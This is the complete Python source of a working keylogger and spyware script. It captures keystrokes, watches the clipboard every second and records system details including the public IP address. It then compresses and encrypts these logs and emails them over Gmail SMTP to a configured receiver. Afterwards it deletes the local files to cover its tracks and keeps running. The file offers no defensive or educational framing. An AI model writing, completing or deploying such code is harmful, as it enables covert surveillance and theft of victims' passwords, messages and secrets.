import threading
import time
import smtplib
import socket
import platform
import pyperclip
import zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
from cryptography.fernet import Fernet
import getpass
import os
from requests import get
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Get environment variables
EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')
RECEIVER_EMAIL = os.getenv('RECEIVER_EMAIL')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')
FILE_PATH = os.getenv('FILE_PATH')

# Check environment variables
if not all([EMAIL_ADDRESS, EMAIL_PASSWORD, RECEIVER_EMAIL, ENCRYPTION_KEY, FILE_PATH]):
    raise ValueError("One or more environment variables are not set.")

# Ensure the file path ends with a slash and create the directory if needed
FILE_PATH = FILE_PATH.rstrip('/') + '/'
os.makedirs(FILE_PATH, exist_ok=True)

# File names for logs
keys_info = FILE_PATH + "key_log.txt"
system_info = FILE_PATH + "system_info.txt"
clipboard_info = FILE_PATH + "clipboard.txt"
encrypted_log_zip = FILE_PATH + "logs.safe"  # Change extension to .safe

time_iteration = 120
number_of_iterations_end = 3

username = getpass.getuser()

# Email function
def send_email(subject, body, filename, attachment, toaddr):
    fromaddr = EMAIL_ADDRESS
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        if os.path.exists(attachment):
            with open(attachment, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(part)
        else:
            print(f"Error: File {attachment} not found.")
            return
    except Exception as e:
        print(f"Error reading attachment: {e}")
        return

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(fromaddr, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Email sent successfully.")
    except smtplib.SMTPAuthenticationError:
        print("Error: Authentication failed. Check the email address and password.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Log system information
def log_system_info():
    try:
        with open(system_info, "w") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + "\n")
            except Exception:
                f.write("Couldn't get Public IP Address\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
    except Exception as e:
        print(f"Error logging system information: {e}")

# Log clipboard content using pyperclip
def log_clipboard():
    try:
        clipboard_data = pyperclip.paste()
        with open(clipboard_info, "a") as f:
            f.write(f"Clipboard Data: \n{clipboard_data}\n")
    except Exception as e:
        print(f"Error logging clipboard: {e}")

# Keylogger and timer
number_of_iterations = 0
keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    try:
        with open(keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def compress_and_encrypt_files(files, output_filename):
    try:
        # Compress files into a zip file
        with zipfile.ZipFile(output_filename, 'w') as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        # Encrypt the zip file
        with open(output_filename, 'rb') as f:
            data = f.read()
        fernet = Fernet(ENCRYPTION_KEY)
        encrypted_data = fernet.encrypt(data)
        with open(output_filename, 'wb') as f:
            f.write(encrypted_data)
    except Exception as e:
        print(f"Error compressing and encrypting files: {e}")

# Delete Files
def delete_files(files):
    for file in files:
        if os.path.exists(file):
            try:
                os.remove(file)
            except Exception as e:
                print(f"Error deleting file {file}: {e}")

# Monitor Clipboard Data
def monitor_clipboard():
    previous_data = ""
    while True:
        clipboard_data = pyperclip.paste()
        if clipboard_data != previous_data:
            previous_data = clipboard_data
            log_clipboard()
        time.sleep(1)

if __name__ == "__main__":
    log_system_info()

    # Start clipboard monitoring in a separate thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

    while number_of_iterations < number_of_iterations_end:
        keys = []
        count = 0
        stoppingTime = time.time() + time_iteration

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while time.time() < stoppingTime:
                listener.join(0.1)

        number_of_iterations += 1

        # Files to be compressed and encrypted
        files_to_process = [system_info, clipboard_info, keys_info]

        compress_and_encrypt_files(files_to_process, encrypted_log_zip)

        # Send email
        send_email("Encrypted Log", "Here are the encrypted logs", 'logs.safe', encrypted_log_zip, RECEIVER_EMAIL)

        # Delete log files after sending
        delete_files(files_to_process + [encrypted_log_zip])

    # Keep the script running
    while True:
        time.sleep(10)
